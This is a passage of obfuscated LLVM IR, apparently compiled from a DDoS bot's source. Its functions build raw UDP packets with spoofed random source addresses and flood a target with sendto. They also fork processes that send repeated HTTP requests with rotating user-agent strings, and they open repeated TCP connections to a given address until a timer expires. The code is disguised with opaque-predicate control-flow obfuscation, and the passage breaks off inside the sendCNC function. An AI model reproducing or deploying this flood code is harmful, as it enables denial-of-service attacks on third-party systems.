  br label %255

; <label>:255:                                    ; preds = %404, %403, %229
  %256 = load i32, i32* @x.65
  %257 = load i32, i32* @y.66
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %255
  %264 = load i32, i32* @x.65
  %265 = load i32, i32* @y.66
  %266 = sub i32 %264, 1
  %267 = mul i32 %264, %266
  %268 = urem i32 %267, 2
  %269 = icmp eq i32 %268, 0
  %270 = icmp slt i32 %265, 10
  %271 = or i1 %269, %270
  br i1 %271, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br label %272

; <label>:272:                                    ; preds = %originalBBpart285
  %273 = load i32, i32* @x.65
  %274 = load i32, i32* @y.66
  %275 = sub i32 %273, 1
  %276 = mul i32 %273, %275
  %277 = urem i32 %276, 2
  %278 = icmp eq i32 %277, 0
  %279 = icmp slt i32 %274, 10
  %280 = or i1 %278, %279
  br i1 %280, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %272
  %281 = load i32, i32* %15, align 4
  %282 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %283 = call i64 @sendto(i32 %281, i8* %180, i64 %178, i32 0, %struct.sockaddr* %282, i32 16)
  %284 = call i32 @rand_cmwc()
  %285 = trunc i32 %284 to i16
  %286 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i32 0, i32 0
  %288 = bitcast %union.anon.2* %287 to %struct.anon.3*
  %289 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %288, i32 0, i32 0
  store i16 %285, i16* %289, align 2
  %290 = load i32, i32* %8, align 4
  %291 = icmp eq i32 %290, 0
  %292 = load i32, i32* @x.65
  %293 = load i32, i32* @y.66
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br i1 %291, label %300, label %318

; <label>:300:                                    ; preds = %originalBBpart289
  %301 = load i32, i32* @x.65
  %302 = load i32, i32* @y.66
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %300
  %309 = call i32 @rand_cmwc()
  %310 = load i32, i32* @x.65
  %311 = load i32, i32* @y.66
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br label %323

; <label>:318:                                    ; preds = %originalBBpart289
  %319 = load i32, i32* %8, align 4
  %320 = trunc i32 %319 to i16
  %321 = call zeroext i16 @htons(i16 zeroext %320) #13
  %322 = zext i16 %321 to i32
  br label %323

; <label>:323:                                    ; preds = %318, %originalBBpart293
  %324 = phi i32 [ %309, %originalBBpart293 ], [ %322, %318 ]
  %325 = load i32, i32* @x.65
  %326 = load i32, i32* @y.66
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %323
  %333 = trunc i32 %324 to i16
  %334 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %335 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %334, i32 0, i32 0
  %336 = bitcast %union.anon.2* %335 to %struct.anon.3*
  %337 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %336, i32 0, i32 1
  store i16 %333, i16* %337, align 2
  %338 = call i32 @rand_cmwc()
  %339 = trunc i32 %338 to i16
  %340 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 3
  store i16 %339, i16* %341, align 4
  %342 = load i32, i32* %18, align 4
  %343 = call i32 @getRandomIP(i32 %342)
  %344 = call i32 @htonl(i32 %343) #13
  %345 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %346 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %345, i32 0, i32 8
  store i32 %344, i32* %346, align 4
  %347 = bitcast i8* %180 to i16*
  %348 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i32 0, i32 2
  %350 = load i16, i16* %349, align 2
  %351 = zext i16 %350 to i32
  %352 = call zeroext i16 @csum(i16* %347, i32 %351)
  %353 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %354 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %353, i32 0, i32 7
  store i16 %352, i16* %354, align 2
  %355 = load i32, i32* %23, align 4
  %356 = load i32, i32* %14, align 4
  %357 = icmp eq i32 %355, %356
  %358 = load i32, i32* @x.65
  %359 = load i32, i32* @y.66
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br i1 %357, label %366, label %404

; <label>:366:                                    ; preds = %originalBBpart297
  %367 = load i32, i32* @x.65
  %368 = load i32, i32* @y.66
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %366
  %375 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %376 = load i32, i32* %22, align 4
  %377 = icmp sgt i32 %375, %376
  %378 = load i32, i32* @x.65
  %379 = load i32, i32* @y.66
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br i1 %377, label %386, label %403

; <label>:386:                                    ; preds = %originalBBpart2101
  %387 = load i32, i32* @x.65
  %388 = load i32, i32* @y.66
  %389 = sub i32 %387, 1
  %390 = mul i32 %387, %389
  %391 = urem i32 %390, 2
  %392 = icmp eq i32 %391, 0
  %393 = icmp slt i32 %388, 10
  %394 = or i1 %392, %393
  br i1 %394, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %386
  %395 = load i32, i32* @x.65
  %396 = load i32, i32* @y.66
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br label %407

; <label>:403:                                    ; preds = %originalBBpart2101
  store i32 0, i32* %23, align 4
  br label %255

; <label>:404:                                    ; preds = %originalBBpart297
  %405 = load i32, i32* %23, align 4
  %406 = add i32 %405, 1
  store i32 %406, i32* %23, align 4
  br label %255

; <label>:407:                                    ; preds = %originalBBpart2105
  %408 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %408)
  br label %409

; <label>:409:                                    ; preds = %407, %119, %113, %originalBBpart28
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %31
  %410 = load i32, i32* %8, align 4
  %411 = trunc i32 %410 to i16
  %412 = call zeroext i16 @htons(i16 zeroext %411) #13
  %413 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %412, i16* %413, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %414 = load i8*, i8** %7, align 8
  %415 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %416 = call i32 @getHost(i8* %414, %struct.in_addr* %415)
  %417 = icmp ne i32 %416, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %90
  %418 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %419 = getelementptr inbounds [8 x i8], [8 x i8]* %418, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %419, i8 0, i64 8, i32 4, i1 false)
  %420 = load i32, i32* %11, align 4
  store i32 %420, i32* %14, align 4
  %421 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %421, i32* %15, align 4
  %422 = load i32, i32* %15, align 4
  %423 = icmp ne i32 %422, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %120
  store i32 50, i32* %17, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %137
  %424 = load i32, i32* %17, align 4
  %_ = sub i32 0, %424
  %gen = add i32 %_, -1
  %_19 = sub i32 0, %424
  %gen20 = add i32 %_19, -1
  %_21 = shl i32 %424, -1
  %_22 = sub i32 0, %424
  %gen23 = add i32 %_22, -1
  %_24 = sub i32 %424, -1
  %gen25 = mul i32 %_24, -1
  %425 = add nsw i32 %424, -1
  store i32 %425, i32* %17, align 4
  %426 = icmp ne i32 %424, 0
  br label %originalBB18

originalBB29alteredBB:                            ; preds = %originalBB29, %162
  %427 = load i32, i32* %12, align 4
  %_30 = shl i32 32, %427
  %_31 = shl i32 32, %427
  %_32 = shl i32 32, %427
  %428 = sub nsw i32 32, %427
  %_33 = sub i32 0, 1
  %gen34 = add i32 %_33, %428
  %429 = shl i32 1, %428
  %_35 = sub i32 %429, 1
  %gen36 = mul i32 %_35, 1
  %430 = sub nsw i32 %429, 1
  %_37 = sub i32 0, %430
  %gen38 = add i32 %_37, -1
  %_39 = sub i32 0, %430
  %gen40 = add i32 %_39, -1
  %_41 = sub i32 %430, -1
  %gen42 = mul i32 %_41, -1
  %_43 = sub i32 0, %430
  %gen44 = add i32 %_43, -1
  %_45 = shl i32 %430, -1
  %_46 = sub i32 %430, -1
  %gen47 = mul i32 %_46, -1
  %_48 = shl i32 %430, -1
  %431 = xor i32 %430, -1
  store i32 %431, i32* %18, align 4
  %432 = load i32, i32* %10, align 4
  %433 = sext i32 %432 to i64
  %_49 = shl i64 28, %433
  %_50 = sub i64 0, 28
  %gen51 = add i64 %_50, %433
  %_52 = sub i64 0, 28
  %gen53 = add i64 %_52, %433
  %_54 = sub i64 0, 28
  %gen55 = add i64 %_54, %433
  %_56 = shl i64 28, %433
  %434 = add i64 28, %433
  %435 = call i8* @llvm.stacksave()
  store i8* %435, i8** %19, align 8
  %436 = alloca i8, i64 %434, align 16
  %437 = bitcast i8* %436 to %struct.iphdr*
  store %struct.iphdr* %437, %struct.iphdr** %20, align 8
  %438 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %439 = bitcast %struct.iphdr* %438 to i8*
  %440 = getelementptr i8, i8* %439, i64 20
  %441 = bitcast i8* %440 to %struct.udphdr*
  store %struct.udphdr* %441, %struct.udphdr** %21, align 8
  %442 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %443 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %444 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %443, i32 0, i32 0
  %445 = load i32, i32* %444, align 4
  %446 = load i32, i32* %18, align 4
  %447 = call i32 @getRandomIP(i32 %446)
  %448 = call i32 @htonl(i32 %447) #13
  %449 = load i32, i32* %10, align 4
  %450 = sext i32 %449 to i64
  %_57 = sub i64 0, 8
  %gen58 = add i64 %_57, %450
  %_59 = sub i64 0, 8
  %gen60 = add i64 %_59, %450
  %_61 = shl i64 8, %450
  %_62 = sub i64 0, 8
  %gen63 = add i64 %_62, %450
  %_64 = sub i64 0, 8
  %gen65 = add i64 %_64, %450
  %_66 = sub i64 0, 8
  %gen67 = add i64 %_66, %450
  %451 = add i64 8, %450
  %452 = trunc i64 %451 to i32
  call void @makeIPPacket(%struct.iphdr* %442, i32 %445, i32 %448, i8 zeroext 17, i32 %452)
  %453 = load i32, i32* %10, align 4
  %454 = sext i32 %453 to i64
  %_68 = sub i64 0, 8
  %gen69 = add i64 %_68, %454
  %_70 = sub i64 8, %454
  %gen71 = mul i64 %_70, %454
  %_72 = sub i64 8, %454
  %gen73 = mul i64 %_72, %454
  %_74 = sub i64 8, %454
  %gen75 = mul i64 %_74, %454
  %_76 = shl i64 8, %454
  %_77 = shl i64 8, %454
  %_78 = sub i64 0, 8
  %gen79 = add i64 %_78, %454
  %455 = add i64 8, %454
  %456 = trunc i64 %455 to i16
  %457 = call zeroext i16 @htons(i16 zeroext %456) #13
  %458 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %459 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %458, i32 0, i32 0
  %460 = bitcast %union.anon.2* %459 to %struct.anon.3*
  %461 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %460, i32 0, i32 2
  store i16 %457, i16* %461, align 2
  %462 = call i32 @rand_cmwc()
  %463 = trunc i32 %462 to i16
  %464 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %465 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %464, i32 0, i32 0
  %466 = bitcast %union.anon.2* %465 to %struct.anon.3*
  %467 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %466, i32 0, i32 0
  store i16 %463, i16* %467, align 2
  %468 = load i32, i32* %8, align 4
  %469 = icmp eq i32 %468, 0
  br label %originalBB29

originalBB83alteredBB:                            ; preds = %originalBB83, %255
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %272
  %470 = load i32, i32* %15, align 4
  %471 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %472 = call i64 @sendto(i32 %470, i8* %180, i64 %178, i32 0, %struct.sockaddr* %471, i32 16)
  %473 = call i32 @rand_cmwc()
  %474 = trunc i32 %473 to i16
  %475 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %476 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %475, i32 0, i32 0
  %477 = bitcast %union.anon.2* %476 to %struct.anon.3*
  %478 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %477, i32 0, i32 0
  store i16 %474, i16* %478, align 2
  %479 = load i32, i32* %8, align 4
  %480 = icmp eq i32 %479, 0
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %300
  %481 = call i32 @rand_cmwc()
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %323
  %482 = trunc i32 %324 to i16
  %483 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %484 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %483, i32 0, i32 0
  %485 = bitcast %union.anon.2* %484 to %struct.anon.3*
  %486 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %485, i32 0, i32 1
  store i16 %482, i16* %486, align 2
  %487 = call i32 @rand_cmwc()
  %488 = trunc i32 %487 to i16
  %489 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %490 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %489, i32 0, i32 3
  store i16 %488, i16* %490, align 4
  %491 = load i32, i32* %18, align 4
  %492 = call i32 @getRandomIP(i32 %491)
  %493 = call i32 @htonl(i32 %492) #13
  %494 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i32 0, i32 8
  store i32 %493, i32* %495, align 4
  %496 = bitcast i8* %180 to i16*
  %497 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %498 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %497, i32 0, i32 2
  %499 = load i16, i16* %498, align 2
  %500 = zext i16 %499 to i32
  %501 = call zeroext i16 @csum(i16* %496, i32 %500)
  %502 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %503 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %502, i32 0, i32 7
  store i16 %501, i16* %503, align 2
  %504 = load i32, i32* %23, align 4
  %505 = load i32, i32* %14, align 4
  %506 = icmp eq i32 %504, %505
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %366
  %507 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %508 = load i32, i32* %22, align 4
  %509 = icmp sgt i32 %507, %508
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %386
  br label %originalBB103
}

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #2
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #2
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = load i32, i32* @x.69
  %8 = load i32, i32* @y.70
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca [512 x i8], align 16
  %26 = alloca [1 x i8], align 1
  store i8* %0, i8** %15, align 8
  store i8* %1, i8** %16, align 8
  store i16 %2, i16* %17, align 2
  store i8* %3, i8** %18, align 8
  store i32 %4, i32* %19, align 4
  store i32 %5, i32* %20, align 4
  %27 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %28 = load i32, i32* %19, align 4
  %29 = add nsw i32 %27, %28
  store i32 %29, i32* %23, align 4
  store i32 0, i32* %24, align 4
  store i32 0, i32* %22, align 4
  %30 = load i32, i32* @x.69
  %31 = load i32, i32* @y.70
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %38

; <label>:38:                                     ; preds = %96, %originalBBpart2
  %39 = load i32, i32* %22, align 4
  %40 = load i32, i32* %20, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %99

; <label>:42:                                     ; preds = %38
  %43 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %44 = load i8*, i8** %15, align 8
  %45 = load i8*, i8** %18, align 8
  %46 = load i8*, i8** %16, align 8
  %47 = call i32 @rand() #2
  %48 = srem i32 %47, 36
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [36 x i8*], [36 x i8*]* @uastrings, i64 0, i64 %49
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 (i8*, i8*, ...) @sprintf(i8* %43, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.82, i32 0, i32 0), i8* %44, i8* %45, i8* %46, i8* %51) #2
  %53 = call i32 @fork() #2
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %95

; <label>:55:                                     ; preds = %42
  %56 = load i32, i32* @x.69
  %57 = load i32, i32* @y.70
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %55
  %64 = load i32, i32* @x.69
  %65 = load i32, i32* @y.70
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %72

; <label>:72:                                     ; preds = %93, %originalBBpart212
  %73 = load i32, i32* %23, align 4
  %74 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %75 = icmp sgt i32 %73, %74
  br i1 %75, label %76, label %94

; <label>:76:                                     ; preds = %72
  %77 = load i8*, i8** %16, align 8
  %78 = load i16, i16* %17, align 2
  %79 = call i32 @socket_connect(i8* %77, i16 zeroext %78)
  store i32 %79, i32* %21, align 4
  %80 = load i32, i32* %21, align 4
  %81 = icmp ne i32 %80, 0
  br i1 %81, label %82, label %93

; <label>:82:                                     ; preds = %76
  %83 = load i32, i32* %21, align 4
  %84 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %85 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %86 = call i64 @strlen(i8* %85) #10
  %87 = call i64 @write(i32 %83, i8* %84, i64 %86)
  %88 = load i32, i32* %21, align 4
  %89 = getelementptr inbounds [1 x i8], [1 x i8]* %26, i32 0, i32 0
  %90 = call i64 @read(i32 %88, i8* %89, i64 1)
  %91 = load i32, i32* %21, align 4
  %92 = call i32 @close(i32 %91)
  br label %93

; <label>:93:                                     ; preds = %82, %76
  br label %72

; <label>:94:                                     ; preds = %72
  call void @exit(i32 0) #14
  unreachable

; <label>:95:                                     ; preds = %42
  br label %96

; <label>:96:                                     ; preds = %95
  %97 = load i32, i32* %22, align 4
  %98 = add nsw i32 %97, 1
  store i32 %98, i32* %22, align 4
  br label %38

; <label>:99:                                     ; preds = %38
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %100 = alloca i8*, align 8
  %101 = alloca i8*, align 8
  %102 = alloca i16, align 2
  %103 = alloca i8*, align 8
  %104 = alloca i32, align 4
  %105 = alloca i32, align 4
  %106 = alloca i32, align 4
  %107 = alloca i32, align 4
  %108 = alloca i32, align 4
  %109 = alloca i32, align 4
  %110 = alloca [512 x i8], align 16
  %111 = alloca [1 x i8], align 1
  store i8* %0, i8** %100, align 8
  store i8* %1, i8** %101, align 8
  store i16 %2, i16* %102, align 2
  store i8* %3, i8** %103, align 8
  store i32 %4, i32* %104, align 4
  store i32 %5, i32* %105, align 4
  %112 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %113 = load i32, i32* %104, align 4
  %_ = shl i32 %112, %113
  %_1 = shl i32 %112, %113
  %_2 = sub i32 0, %112
  %gen = add i32 %_2, %113
  %_3 = sub i32 0, %112
  %gen4 = add i32 %_3, %113
  %_5 = sub i32 0, %112
  %gen6 = add i32 %_5, %113
  %_7 = shl i32 %112, %113
  %_8 = sub i32 %112, %113
  %gen9 = mul i32 %_8, %113
  %114 = add nsw i32 %112, %113
  store i32 %114, i32* %108, align 4
  store i32 0, i32* %109, align 4
  store i32 0, i32* %107, align 4
  br label %originalBB

originalBB10alteredBB:                            ; preds = %originalBB10, %55
  br label %originalBB10
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add nsw i32 %10, %11
  store i32 %12, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @inet_addr(i8* %13) #2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i32, i32* %5, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #13
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  br label %22

; <label>:22:                                     ; preds = %originalBBpart2, %3
  %23 = load i32, i32* %7, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = icmp sgt i32 %23, %24
  br i1 %25, label %26, label %50

; <label>:26:                                     ; preds = %22
  %27 = load i32, i32* @x.71
  %28 = load i32, i32* @y.72
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %26
  %35 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %35, i32* %8, align 4
  %36 = load i32, i32* %8, align 4
  %37 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %38 = call i32 @connect(i32 %36, %struct.sockaddr* %37, i32 16)
  %39 = call i32 @sleep(i32 1)
